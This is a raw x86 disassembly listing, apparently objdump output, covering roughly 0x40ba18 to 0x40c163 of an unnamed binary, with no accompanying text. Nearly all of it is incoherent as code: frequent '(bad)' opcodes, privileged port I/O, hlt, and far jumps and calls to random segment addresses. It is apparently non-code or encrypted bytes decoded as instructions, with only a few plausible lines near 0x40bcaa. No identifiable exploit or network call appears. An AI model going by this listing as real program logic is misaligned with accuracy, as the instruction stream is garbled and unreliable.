  40ba18:	add    al,0xb7
  40ba1a:	sub    BYTE PTR [esi-0x5243cffc],bh
  40ba20:	jmp    0x3789:0xec2640e5
  40ba27:	outs   dx,DWORD PTR ds:[esi]
  40ba28:	int    0x65
  40ba2a:	or     eax,DWORD PTR [ebx]
  40ba2c:	loopne 0x40b9f0
  40ba2e:	sti    
  40ba2f:	adc    DWORD PTR [esi-0x5fb5fe7d],edx
  40ba35:	popa   
  40ba36:	das    
  40ba37:	pop    ecx
  40ba38:	fisubr DWORD PTR [ebx]
  40ba3a:	dec    ebx
  40ba3b:	stc    
  40ba3c:	fisttp DWORD PTR [ebp-0x6de15182]
  40ba42:	fs mov cl,0x38
  40ba45:	aas    
  40ba46:	lods   al,BYTE PTR ds:[esi]
  40ba47:	or     dh,BYTE PTR [edi-0x2e7eb97b]
  40ba4d:	addr16 mov al,ds:0x318
  40ba51:	ins    DWORD PTR es:[edi],dx
  40ba52:	lods   eax,DWORD PTR ds:[esi]
  40ba53:	(bad)  
  40ba54:	idiv   edx
  40ba56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba57:	out    0x16,al
  40ba59:	sbb    dh,BYTE PTR [esi-0x78be4d84]
  40ba5f:	(bad)  
  40ba60:	push   ss
  40ba61:	popf   
  40ba62:	mov    esi,0x85f28fca
  40ba67:	aam    0xbf
  40ba69:	or     eax,0x8192e9d4
  40ba6e:	hlt    
  40ba6f:	jp     0x40ba2f
  40ba71:	xchg   ebx,eax
  40ba72:	popa   
  40ba73:	push   ebp
  40ba74:	sahf   
  40ba75:	(bad)  [ecx+0x6c383ad8]
  40ba7b:	xchg   ebx,eax
  40ba7c:	loope  0x40ba0b
  40ba7e:	xchg   DWORD PTR [esi-0x11],edi
  40ba81:	gs stc 
  40ba83:	push   edi
  40ba84:	adc    eax,0xe618c401
  40ba89:	adc    al,0xf7
  40ba8b:	xchg   edx,eax
  40ba8c:	inc    ecx
  40ba8d:	arpl   WORD PTR ds:0x3cc7ebde,sp
  40ba93:	mov    dh,0x2b
  40ba95:	lahf   
  40ba96:	cmp    eax,0x1f0b3e19
  40ba9b:	mov    gs:0xcfe390dd,al
  40baa1:	sti    
  40baa2:	pop    ss
  40baa3:	mov    al,ds:0xf640ea28
  40baa8:	shl    edx,1
  40baaa:	jnp    0x40bb00
  40baac:	xchg   ecx,eax
  40baad:	add    eax,0xb6eb3336
  40bab2:	shl    BYTE PTR [ecx],0xb3
  40bab5:	adc    DWORD PTR [esp+ebx*8],eax
  40bab8:	jne    0x40bb24
  40baba:	out    dx,eax
  40babb:	ficom  DWORD PTR [edi+eax*4+0x1a7312b3]
  40bac2:	loope  0x40ba52
  40bac4:	daa    
  40bac5:	icebp  
  40bac6:	fwait
  40bac7:	sbb    BYTE PTR [edi-0x75eb78c3],bh
  40bacd:	push   cs
  40bace:	pop    ds
  40bacf:	rcr    BYTE PTR [eax-0x2d],0x5c
  40bad3:	daa    
  40bad4:	mov    WORD PTR [esi-0x3762a08d],fs
  40bada:	xchg   BYTE PTR cs:[edi-0x4e],bl
  40bade:	cs out 0x9,al
  40bae1:	jb     0x40ba98
  40bae3:	add    al,0x2
  40bae5:	mov    cs,ecx
  40bae7:	jns    0x40bb36
  40bae9:	mov    bh,0x87
  40baeb:	test   al,0xed
  40baed:	repnz adc BYTE PTR [edi],bh
  40baf0:	(bad)  
  40baf1:	jno    0x40bac3
  40baf3:	sub    eax,0x4da787c4
  40baf8:	cs pop ecx
  40bafa:	sbb    BYTE PTR [ebx-0x68996cfe],0x9
  40bb01:	repnz adc esi,DWORD PTR [esi]
  40bb04:	add    DWORD PTR [ebx-0x3a],esi
  40bb07:	aam    0x53
  40bb09:	fmul   DWORD PTR [ebp+0xd]
  40bb0c:	int3   
  40bb0d:	mov    bh,0xff
  40bb0f:	out    dx,al
  40bb10:	fwait
  40bb11:	sub    bl,0x30
  40bb14:	(bad)  
  40bb15:	out    dx,eax
  40bb16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb17:	cmp    esi,DWORD PTR [edx-0x39]
  40bb1a:	sbb    BYTE PTR [ebp+0x47],bl
  40bb1d:	retf   
  40bb1e:	out    0xf8,al
  40bb20:	sti    
  40bb21:	push   ebp
  40bb22:	dec    ebp
  40bb23:	push   esi
  40bb24:	stc    
  40bb25:	jb     0x40bb68
  40bb27:	in     eax,dx
  40bb28:	jno    0x40bb81
  40bb2a:	sahf   
  40bb2b:	adc    edi,eax
  40bb2d:	or     bh,BYTE PTR [edi+0x5c3d2243]
  40bb33:	or     BYTE PTR [eax],0x5f
  40bb36:	push   0xffffffed
  40bb38:	cmp    al,0xe5
  40bb3a:	(bad)  
  40bb3b:	mov    esp,0xf016d583
  40bb40:	int3   
  40bb41:	dec    DWORD PTR [esi]
  40bb43:	loopne 0x40bb52
  40bb45:	stos   BYTE PTR es:[edi],al
  40bb46:	push   ecx
  40bb47:	shl    DWORD PTR [edi],cl
  40bb49:	mov    ds:0x43549669,al
  40bb4e:	ror    cl,1
  40bb50:	ss popa 
  40bb52:	into   
  40bb53:	push   es
  40bb54:	out    dx,al
  40bb55:	pop    edi
  40bb56:	sbb    BYTE PTR [edi],al
  40bb58:	loopne 0x40bb21
  40bb5a:	ins    BYTE PTR es:[edi],dx
  40bb5b:	sub    BYTE PTR [ebx-0x4],dl
  40bb5e:	and    BYTE PTR [eax-0x8],ch
  40bb61:	out    dx,al
  40bb62:	push   edi
  40bb63:	mov    al,BYTE PTR [edi]
  40bb65:	xor    ch,ah
  40bb67:	icebp  
  40bb68:	dec    ecx
  40bb69:	jge    0x40bb43
  40bb6b:	(bad)  
  40bb6c:	xchg   esp,eax
  40bb6d:	dec    edx
  40bb6e:	sti    
  40bb6f:	iret   
  40bb70:	mov    ds:0x4fc5dffd,al
  40bb75:	push   0x73
  40bb77:	pop    edx
  40bb78:	cdq    
  40bb79:	jae    0x40bb8e
  40bb7b:	retf   
  40bb7c:	cwde   
  40bb7d:	(bad)  
  40bb7e:	jmp    0x92e4f8dc
  40bb83:	pop    esi
  40bb84:	jle    0x40bb12
  40bb86:	jbe    0x40bbb0
  40bb88:	data16 add al,0x1a
  40bb8b:	fsubr  st,st(7)
  40bb8d:	fadd   QWORD PTR [ecx]
  40bb8f:	mov    ebp,0x8a5f52dc
  40bb94:	ja     0x40bbf6
  40bb96:	lods   eax,DWORD PTR ds:[esi]
  40bb97:	rcr    ebp,0xbf
  40bb9a:	data16 xlat BYTE PTR ds:[ebx]
  40bb9c:	and    bl,al
  40bb9e:	mov    ebx,0xde5ef38a
  40bba3:	sar    DWORD PTR [edx-0xd],1
  40bba6:	ret    
  40bba7:	pop    edx
  40bba8:	cld    
  40bba9:	inc    ebx
  40bbaa:	fdivr  QWORD PTR [ecx+ebp*2+0x569a701e]
  40bbb1:	cmp    eax,0x930c1ae1
  40bbb6:	loope  0x40bbf0
  40bbb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbb9:	cld    
  40bbba:	rcl    BYTE PTR [eax],0x5f
  40bbbd:	push   esp
  40bbbe:	pop    ecx
  40bbbf:	inc    edx
  40bbc0:	and    BYTE PTR [ecx+0x6c9fdeb2],dl
  40bbc6:	sub    DWORD PTR [ebp-0x43735bf1],esp
  40bbcc:	and    eax,0x3f84a6b2
  40bbd1:	jp     0x40bc4a
  40bbd3:	mov    eax,ds:0x811d7f77
  40bbd8:	test   eax,0xd5e9f97d
  40bbdd:	nop
  40bbde:	jg     0x40bc08
  40bbe0:	mov    edi,0x24c032ce
  40bbe5:	daa    
  40bbe6:	fbstp  TBYTE PTR [ecx]
  40bbe8:	dec    edi
  40bbe9:	scas   eax,DWORD PTR es:[edi]
  40bbea:	dec    esi
  40bbeb:	das    
  40bbec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbed:	call   0xa453:0xf9f11d69
  40bbf4:	(bad)
  40bbf7:	jmp    0x3ec0:0x21fc540
  40bbfe:	push   esp
  40bbff:	jmp    0xa06a53eb
  40bc04:	pop    ebp
  40bc05:	bound  eax,QWORD PTR [ebp-0x6c]
  40bc08:	jmp    0x40bc47
  40bc0a:	(bad)  
  40bc0b:	in     eax,0x68
  40bc0d:	aaa    
  40bc0e:	add    al,dh
  40bc10:	jmp    0xb937b7e9
  40bc15:	test   BYTE PTR [edi],ch
  40bc17:	out    dx,al
  40bc18:	fiadd  DWORD PTR [ebx+0x60ba4a4e]
  40bc1e:	push   cs
  40bc1f:	neg    DWORD PTR [edi-0xfec24f1]
  40bc25:	sbb    DWORD PTR [edi],0xef7876a7
  40bc2b:	sub    al,0xc3
  40bc2d:	in     eax,dx
  40bc2e:	push   edi
  40bc2f:	cmp    esi,ecx
  40bc31:	in     eax,dx
  40bc32:	or     BYTE PTR [ecx+eiz*8-0x77],0x4
  40bc37:	daa    
  40bc38:	mov    ebx,0x89627099
  40bc3d:	push   ebp
  40bc3e:	(bad)  
  40bc3f:	imul   esp,DWORD PTR [ecx],0x857655d6
  40bc45:	shr    DWORD PTR [eax+0x15],cl
  40bc48:	addr16 jns 0x40bc70
  40bc4b:	pandn  mm2,QWORD PTR [ecx]
  40bc4e:	sub    BYTE PTR [esi+0xd],ch
  40bc51:	leave  
  40bc52:	mov    esi,0x971b2898
  40bc57:	popf   
  40bc58:	lahf   
  40bc59:	mov    cl,0x93
  40bc5b:	test   BYTE PTR [ecx],ch
  40bc5d:	dec    ebx
  40bc5e:	push   ecx
  40bc5f:	mov    ebp,0x8c652c6e
  40bc64:	inc    ecx
  40bc65:	jge    0x40bc26
  40bc67:	mov    ch,0x56
  40bc69:	loop   0x40bc1a
  40bc6b:	pop    ecx
  40bc6c:	popa   
  40bc6d:	addr16 dec ecx
  40bc6f:	jle    0x40bc6d
  40bc71:	cmp    DWORD PTR [ecx+0x8762750],ebp
  40bc77:	mov    al,0x76
  40bc79:	sub    eax,0xa0c446cc
  40bc7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc7f:	mov    esp,0x429c56b7
  40bc84:	cwde   
  40bc85:	std    
  40bc86:	stc    
  40bc87:	mov    bh,bh
  40bc89:	sti    
  40bc8a:	pop    esi
  40bc8b:	mov    ebx,0x4eb52160
  40bc90:	or     BYTE PTR [edx-0x34],ch
  40bc93:	pop    ecx
  40bc94:	xlat   BYTE PTR ds:[ebx]
  40bc95:	scas   al,BYTE PTR es:[edi]
  40bc96:	enter  0x7596,0x5e
  40bc9a:	call   0xa488:0x86afad26
  40bca1:	sub    al,0xcf
  40bca3:	xchg   ecx,eax
  40bca4:	aaa    
  40bca5:	mov    ch,0x96
  40bca7:	ret    0xf2a1
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	adc    edi,DWORD PTR [edi+edx*8]
  40bcd5:	std    
  40bcd6:	in     al,0x8e
  40bcd8:	jle    0x40bd58
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	pop    ss
  40bcdf:	push   ebp
  40bce0:	shl    bh,0x96
  40bce3:	stc    
  40bce4:	sahf   
  40bce5:	sbb    eax,0x1a65e344
  40bcea:	and    BYTE PTR [eax+0x6731bf8c],ah
  40bcf0:	mov    esi,0xa626431d
  40bcf5:	(bad)  
  40bcf6:	cmc    
  40bcf7:	dec    BYTE PTR [esi-0x38b9406a]
  40bcfd:	push   edx
  40bcfe:	scas   al,BYTE PTR es:[edi]
  40bcff:	xchg   ebx,eax
  40bd00:	jno    0x40bd3b
  40bd02:	rol    BYTE PTR [ebp+0x64],0xb7
  40bd06:	dec    ebp
  40bd07:	add    al,0x9
  40bd09:	icebp  
  40bd0a:	push   es
  40bd0b:	outs   dx,BYTE PTR ds:[esi]
  40bd0c:	push   esi
  40bd0d:	xchg   BYTE PTR [esi],cl
  40bd0f:	sar    DWORD PTR [edx-0x15],1
  40bd12:	call   0x9a9a3e17
  40bd17:	pop    esp
  40bd18:	mov    ah,0xaf
  40bd1a:	int    0x6f
  40bd1c:	ins    DWORD PTR es:[edi],dx
  40bd1d:	and    BYTE PTR ds:0xe241d0d1,0xf1
  40bd24:	inc    ebx
  40bd25:	xchg   ebx,eax
  40bd26:	fiadd  WORD PTR [ebx-0x6045fe25]
  40bd2c:	popf   
  40bd2d:	adc    al,0xa8
  40bd2f:	push   esp
  40bd30:	and    dl,al
  40bd32:	jnp    0x40bd1a
  40bd34:	test   ebp,0x5cea5a2f
  40bd3a:	adc    BYTE PTR [ebx+0x53],dh
  40bd3d:	inc    esp
  40bd3e:	jbe    0x40bd54
  40bd40:	in     al,0xba
  40bd42:	bound  ecx,QWORD PTR [edx+0x78]
  40bd45:	add    esi,0x2f
  40bd48:	shr    DWORD PTR ds:0xffbdb68,cl
  40bd4e:	icebp  
  40bd4f:	inc    esp
  40bd50:	lock mov ch,0xb6
  40bd53:	pop    es
  40bd54:	(bad)
  40bd57:	lahf   
  40bd58:	adc    DWORD PTR [ebp+0x45ac95dc],0x47
  40bd5f:	fld    DWORD PTR [edx]
  40bd61:	imul   esp,DWORD PTR [edi+0x14],0x444ac5e1
  40bd68:	out    0xd3,al
  40bd6a:	and    BYTE PTR [eax+0x30],bh
  40bd6d:	mov    ah,0x33
  40bd6f:	and    ah,BYTE PTR [edx]
  40bd71:	push   0x10
  40bd73:	test   eax,0x785d4f2c
  40bd78:	dec    ecx
  40bd79:	(bad)  
  40bd7a:	jge    0x40bddc
  40bd7c:	std    
  40bd7d:	cmp    BYTE PTR [ecx+0x10086e2e],0xea
  40bd84:	add    al,0x6c
  40bd86:	shl    dl,0xd2
  40bd89:	mov    edx,0xc96fb779
  40bd8e:	popa   
  40bd8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd90:	jno    0x40bd1b
  40bd92:	sar    DWORD PTR [eax],1
  40bd94:	jg     0x40bd7f
  40bd96:	adc    eax,0x951aa7a4
  40bd9b:	mov    eax,ds:0x570a5bc6
  40bda0:	inc    eax
  40bda1:	lock mov BYTE PTR [ebp-0x7b],0x9d
  40bda6:	inc    edi
  40bda7:	xor    edi,esi
  40bda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdaa:	xchg   edx,eax
  40bdab:	adc    ebx,esp
  40bdad:	out    0x40,eax
  40bdaf:	lods   eax,DWORD PTR ds:[esi]
  40bdb0:	into   
  40bdb1:	xor    esp,DWORD PTR [ebp-0x298fc5aa]
  40bdb7:	push   cs
  40bdb8:	jmp    0x15e4a2a0
  40bdbd:	and    al,0x2
  40bdbf:	sbb    al,BYTE PTR [edx+0x1a]
  40bdc2:	fdivr  st,st(5)
  40bdc4:	fidivr WORD PTR [eax+0x46de063f]
  40bdca:	loope  0x40bde2
  40bdcc:	leave  
  40bdcd:	xor    BYTE PTR [esi-0x30],0xda
  40bdd1:	loopne 0x40be03
  40bdd3:	inc    eax
  40bdd4:	cmp    DWORD PTR [ecx],eax
  40bdd6:	push   0x6bb816c5
  40bddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bddc:	dec    edx
  40bddd:	jo     0x40be3f
  40bddf:	int3   
  40bde0:	mov    cl,0xa7
  40bde2:	or     BYTE PTR [edx+0x71],0xf3
  40bde6:	dec    ebx
  40bde7:	es es jp 0x40bd6c
  40bdeb:	cmp    DWORD PTR [esi-0x19e8dedf],esp
  40bdf1:	test   eax,0xeb2ce26d
  40bdf6:	ins    BYTE PTR es:[edi],dx
  40bdf7:	js     0x40bd87
  40bdf9:	add    BYTE PTR [edi],ch
  40bdfb:	bound  ebp,QWORD PTR [edx]
  40bdfd:	nop
  40bdfe:	mov    ds:0x49328499,al
  40be03:	or     edx,eax
  40be05:	inc    edi
  40be06:	push   0xffffffdf
  40be08:	cwde   
  40be09:	jnp    0x40be44
  40be0b:	add    DWORD PTR [edx*2-0xc2bc4e9],esi
  40be12:	xor    eax,0x30bae8c8
  40be17:	out    dx,eax
  40be18:	pop    edx
  40be19:	mov    dl,0xb7
  40be1b:	inc    ecx
  40be1c:	stos   BYTE PTR es:[edi],al
  40be1d:	pop    edx
  40be1e:	cmp    ebx,0x4c
  40be21:	cmp    eax,DWORD PTR [bx]
  40be24:	test   BYTE PTR [ebx+ebx*4],dl
  40be27:	sbb    al,BYTE PTR [esi]
  40be29:	or     BYTE PTR [edx-0x66],ch
  40be2c:	push   edx
  40be2d:	daa    
  40be2e:	addr16 dec esi
  40be30:	outs   dx,DWORD PTR ds:[esi]
  40be31:	or     al,0xe4
  40be33:	jmp    0x999:0x9687542a
  40be3a:	mov    edx,ebp
  40be3c:	repnz mov dh,0xd2
  40be3f:	clc    
  40be40:	retf   
  40be41:	test   al,0x46
  40be43:	lahf   
  40be44:	stos   BYTE PTR es:[edi],al
  40be45:	pop    esi
  40be46:	inc    ebx
  40be47:	fiadd  WORD PTR [ecx-0x33]
  40be4a:	and    al,0xf5
  40be4c:	pop    ecx
  40be4d:	adc    BYTE PTR [edi-0x75],al
  40be50:	xchg   esi,eax
  40be51:	mov    edi,esi
  40be53:	test   eax,0xcfc27ceb
  40be58:	push   0x65cd84fa
  40be5d:	clc    
  40be5e:	add    al,0xec
  40be60:	fucomip st,st(7)
  40be62:	pop    es
  40be63:	fcomip st,st(3)
  40be65:	out    0x9b,eax
  40be67:	inc    edx
  40be68:	les    edi,FWORD PTR [ebp-0x18]
  40be6b:	dec    edi
  40be6c:	inc    eax
  40be6d:	xlat   BYTE PTR ds:[ebx]
  40be6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be6f:	cmc    
  40be70:	das    
  40be71:	fbstp  TBYTE PTR [eax]
  40be73:	xor    eax,0x94770ee7
  40be78:	xor    ecx,eax
  40be7a:	mov    ds:0xe4ebf9a4,al
  40be7f:	addr16 fucomip st,st(5)
  40be82:	sahf   
  40be83:	popf   
  40be84:	pop    es
  40be85:	lds    ebx,FWORD PTR [edx-0x3070bb78]
  40be8b:	jecxz  0x40bee7
  40be8d:	inc    bp
  40be8f:	xor    al,0x15
  40be91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be92:	jo     0x40bef8
  40be94:	in     al,dx
  40be95:	lahf   
  40be96:	in     eax,dx
  40be97:	sti    
  40be98:	cmp    ebp,DWORD PTR [ecx+eiz*2-0x1d58b96a]
  40be9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea0:	and    al,0xe5
  40bea2:	xchg   ebp,eax
  40bea3:	mov    eax,ds:0x31ff2d5d
  40bea8:	mov    dh,0xe6
  40beaa:	call   0x61133353
  40beaf:	push   ds
  40beb0:	lea    ebp,[ebx+0x3a]
  40beb3:	or     edi,edx
  40beb5:	ja     0x40be72
  40beb7:	aad    0xdc
  40beb9:	cmp    al,0xf3
  40bebb:	test   al,0x4e
  40bebd:	xchg   ebp,eax
  40bebe:	ror    cl,1
  40bec0:	stos   DWORD PTR es:[edi],eax
  40bec1:	inc    ebx
  40bec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec3:	jno    0x40bf25
  40bec5:	arpl   si,si
  40bec7:	dec    ebp
  40bec8:	in     eax,dx
  40bec9:	shl    DWORD PTR [edx+0x195a15cd],0x8b
  40bed0:	xor    eax,0x2869135f
  40bed5:	jbe    0x40be9a
  40bed7:	imul   esi,DWORD PTR [ecx],0x339c7a84
  40bedd:	repz pop ecx
  40bedf:	dec    eax
  40bee0:	es and eax,0x5c7097a4
  40bee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee7:	mov    ecx,0xe36dbba6
  40beec:	inc    DWORD PTR [edx+0x7e]
  40beef:	lock int 0x51
  40bef2:	sti    
  40bef3:	dec    edx
  40bef4:	mov    eax,ds:0x2a551631
  40bef9:	xor    al,0x3c
  40befb:	sar    BYTE PTR [ebp-0x2],0xd7
  40beff:	outs   dx,DWORD PTR ds:[esi]
  40bf00:	sbb    DWORD PTR [edi+0x2a],edi
  40bf03:	cmc    
  40bf04:	push   0x362a6014
  40bf09:	push   esp
  40bf0a:	inc    edi
  40bf0b:	shl    ebp,0xf7
  40bf0e:	and    al,BYTE PTR ds:0x433e5a22
  40bf14:	test   eax,0xdb0cd52d
  40bf19:	xor    edi,DWORD PTR [esi+0x407b658b]
  40bf1f:	jecxz  0x40bea1
  40bf21:	dec    ebp
  40bf22:	repnz pop edx
  40bf24:	aas    
  40bf25:	outs   dx,BYTE PTR ds:[esi]
  40bf26:	shl    DWORD PTR [ebp+esi*4+0x56f51c3f],0x39
  40bf2e:	sbb    esp,DWORD PTR [edi]
  40bf30:	aad    0xfd
  40bf32:	out    dx,eax
  40bf33:	xchg   esp,eax
  40bf34:	mov    ebp,0x248dbee8
  40bf39:	mov    ecx,0x9663a5af
  40bf3e:	xlat   BYTE PTR ds:[ebx]
  40bf3f:	cmp    al,0x8
  40bf41:	jmp    DWORD PTR [esi+edx*2]
  40bf44:	or     eax,0x47032375
  40bf49:	call   0x27e1be14
  40bf4e:	inc    ebx
  40bf4f:	sbb    al,0xd6
  40bf51:	sub    bh,BYTE PTR [ecx-0x192ebeb8]
  40bf57:	inc    esi
  40bf58:	push   edi
  40bf59:	mov    eax,0x1baf6187
  40bf5e:	shr    DWORD PTR [edx-0x4a],1
  40bf61:	pop    ebp
  40bf62:	or     ebx,0x51e03281
  40bf68:	pop    ecx
  40bf69:	mov    eax,ds:0x6543120c
  40bf6e:	ins    DWORD PTR es:[edi],dx
  40bf6f:	mov    ebp,esp
  40bf71:	sbb    ebp,DWORD PTR [ecx]
  40bf73:	jmp    0x40bf87
  40bf75:	cmp    al,0xba
  40bf77:	ds jno 0x40bf87
  40bf7a:	adc    bh,BYTE PTR [esi+edx*4-0x4738a04]
  40bf81:	mov    ds:0x59bd2f02,eax
  40bf86:	fst    DWORD PTR gs:[ecx+0x7d]
  40bf8a:	inc    ecx
  40bf8b:	jg     0x40bfe1
  40bf8d:	lock push cs
  40bf8f:	icebp  
  40bf90:	pushf  
  40bf91:	rcl    BYTE PTR [ebp-0x42],cl
  40bf94:	shl    DWORD PTR [eax],1
  40bf96:	and    ch,bh
  40bf98:	push   eax
  40bf99:	dec    esp
  40bf9a:	out    0x2e,eax
  40bf9c:	sub    al,0x28
  40bf9e:	popf   
  40bf9f:	mov    al,0x26
  40bfa1:	cmc    
  40bfa2:	push   es
  40bfa3:	dec    ebx
  40bfa4:	cwde   
  40bfa5:	pop    ss
  40bfa6:	pop    edx
  40bfa7:	int    0xe
  40bfa9:	test   edi,eax
  40bfab:	push   0x13
  40bfad:	(bad)  
  40bfae:	fild   QWORD PTR [ebx-0x33]
  40bfb1:	jmp    0x44221a6b
  40bfb6:	scas   eax,DWORD PTR es:[edi]
  40bfb7:	loop   0x40bffb
  40bfb9:	xor    BYTE PTR [eax],0xd1
  40bfbc:	daa    
  40bfbd:	dec    ch
  40bfbf:	loope  0x40bf75
  40bfc1:	aad    0x74
  40bfc3:	jmp    FWORD PTR [edx]
  40bfc5:	adc    dh,bh
  40bfc7:	int    0x93
  40bfc9:	jg     0x40bff8
  40bfcb:	rcr    BYTE PTR [eax+ecx*1+0x1f4f18f0],cl
  40bfd2:	jb     0x40bfc1
  40bfd4:	repnz out 0xe4,al
  40bfd7:	cmp    eax,0xf137c809
  40bfdc:	or     al,0xd7
  40bfde:	pop    eax
  40bfdf:	gs fs sbb al,0x45
  40bfe3:	int3   
  40bfe4:	add    edx,DWORD PTR [eax-0x66624410]
  40bfea:	(bad)  
  40bfeb:	jo     0x40c00a
  40bfed:	xor    BYTE PTR [edi],ch
  40bfef:	mov    bh,0xa9
  40bff1:	or     edx,edi
  40bff3:	aam    0x76
  40bff5:	mov    al,ds:0x998b7f41
  40bffa:	(bad)  
  40bffb:	shl    BYTE PTR [ebx-0x5fdddd],cl
  40c001:	sbb    DWORD PTR [eax],ecx
  40c003:	sub    DWORD PTR [eax+0x62],esi
  40c006:	scas   eax,DWORD PTR es:[edi]
  40c007:	mov    eax,0xfe1837d0
  40c00c:	or     dh,bh
  40c00e:	pop    es
  40c00f:	in     eax,dx
  40c010:	fsub   st(7),st
  40c012:	fisub  DWORD PTR [edx-0x14]
  40c015:	psubusw mm6,QWORD PTR [ebp+0x10]
  40c019:	xor    DWORD PTR [ecx-0x33],edx
  40c01c:	cmp    BYTE PTR [edi*8-0x6eee172e],0x3
  40c024:	pusha  
  40c025:	fs retf 0xcdf6
  40c029:	dec    ebp
  40c02a:	inc    ebp
  40c02b:	addr16 paddq mm3,mm0
  40c02f:	fs test edx,esp
  40c032:	xchg   edx,eax
  40c033:	in     al,0x3e
  40c035:	loop   0x40c079
  40c037:	pop    edi
  40c038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c039:	fadd   QWORD PTR [ebp+0x1d0bf0b1]
  40c03f:	push   esp
  40c040:	xchg   esp,eax
  40c041:	xchg   edx,eax
  40c042:	sub    ah,BYTE PTR [esi-0x77]
  40c045:	adc    DWORD PTR [edi],esi
  40c047:	cmovp  esi,DWORD PTR [ebp+0x3b26c289]
  40c04e:	fcomp  st(0)
  40c050:	or     al,0x62
  40c052:	arpl   WORD PTR [ebx+0x78701594],si
  40c058:	into   
  40c059:	mov    eax,ds:0xe8aa0b49
  40c05e:	mov    ds:0x65835393,eax
  40c063:	xchg   ebp,eax
  40c064:	dec    esi
  40c065:	adc    ecx,DWORD PTR [esi-0x6a]
  40c068:	push   edi
  40c069:	xchg   edx,eax
  40c06a:	mov    al,ds:0xfbd115d4
  40c06f:	stos   BYTE PTR es:[edi],al
  40c070:	fnstcw WORD PTR [ebp+0x52]
  40c073:	fisttp WORD PTR gs:[si+0x4c08]
  40c079:	jno    0x40c009
  40c07b:	mov    ds:0x25f5d826,al
  40c080:	in     eax,dx
  40c081:	enter  0x1952,0x98
  40c085:	(bad)  
  40c086:	cdq    
  40c087:	into   
  40c088:	pop    ss
  40c089:	dec    esp
  40c08a:	(bad)  
  40c08b:	fcmovu st,st(7)
  40c08d:	inc    edi
  40c08e:	outs   dx,DWORD PTR ds:[esi]
  40c08f:	adc    ch,BYTE PTR ds:0x6064ac07
  40c095:	or     bh,BYTE PTR [edi+0xad1ce5c]
  40c09b:	cmp    al,0x18
  40c09d:	pop    edx
  40c09e:	es jle 0x40c118
  40c0a1:	add    al,0x81
  40c0a3:	push   esi
  40c0a4:	mov    ebx,0x63a58d44
  40c0a9:	add    eax,0x13ef6823
  40c0ae:	mov    BYTE PTR [eax-0xa0c7daa],cl
  40c0b4:	rcr    BYTE PTR [esi],1
  40c0b6:	xor    al,0xbc
  40c0b8:	neg    dh
  40c0ba:	test   BYTE PTR [ebx],ah
  40c0bc:	add    al,0xbc
  40c0be:	fidivr DWORD PTR [edi]
  40c0c0:	inc    ebx
  40c0c1:	push   cs
  40c0c2:	and    BYTE PTR [ebx+0x168c635b],dh
  40c0c8:	in     eax,dx
  40c0c9:	and    al,0x4
  40c0cb:	out    dx,eax
  40c0cc:	and    al,0x92
  40c0ce:	sbb    ebx,ebp
  40c0d0:	and    edx,0x63
  40c0d3:	sbb    BYTE PTR ds:0x300aea2,bl
  40c0d9:	stc    
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	rcl    BYTE PTR [edi+0x7b],1
  40c0ef:	cmp    eax,0x7e8ade19
  40c0f4:	jle    0x40c166
  40c0f6:	jns    0x40c176
  40c0f8:	jle    0x40c087
  40c0fa:	mul    DWORD PTR [ebx+0x3634a153]
  40c100:	mov    bl,0xa2
  40c102:	mov    ecx,edx
  40c104:	lea    eax,[edi-0x36d6be6a]
  40c10a:	(bad)  
  40c10b:	xor    bl,dl
  40c10d:	in     eax,0x9f
  40c10f:	in     eax,0x3
  40c111:	or     dl,BYTE PTR es:[eax+0xa74859a]
  40c118:	(bad)  
  40c119:	xor    DWORD PTR [ebx-0x67],ebp
  40c11c:	cs dec edx
  40c11e:	xor    al,0x2c
  40c120:	jnp    0x40c0e7
  40c122:	clc    
  40c123:	push   esi
  40c124:	jg     0x40c0b5
  40c126:	push   0xd06f481e
  40c12b:	mov    ebp,edx
  40c12d:	xchg   ebx,eax
  40c12e:	aas    
  40c12f:	stc    
  40c130:	ret    0xc8a2
  40c133:	push   0x15
  40c135:	add    dl,bl
  40c137:	mov    cl,0x4f
  40c139:	(bad)  
  40c13a:	push   edi
  40c13b:	jbe    0x40c122
  40c13d:	out    dx,al
  40c13e:	xchg   ebp,eax
  40c13f:	scas   al,BYTE PTR es:[edi]
  40c140:	data16 mov bh,BYTE PTR [eax]
  40c143:	or     al,0xc4
  40c145:	sbb    bh,BYTE PTR [ecx]
  40c147:	hlt    
  40c148:	mov    ds:0xba4b1ca6,eax
  40c14d:	dec    DWORD PTR [esi+esi*1-0x213276e8]
  40c154:	shr    eax,0xf7
  40c157:	inc    ebx
  40c158:	aam    0xce
  40c15a:	add    DWORD PTR [ecx+ecx*1],ebx
  40c15d:	jle    0x40c0e0
  40c15f:	lods   eax,DWORD PTR ds:[esi]
  40c160:	inc    esp
  40c161:	xor    al,0x12
  40c163:	lea    ebx,[ecx+eax*1]
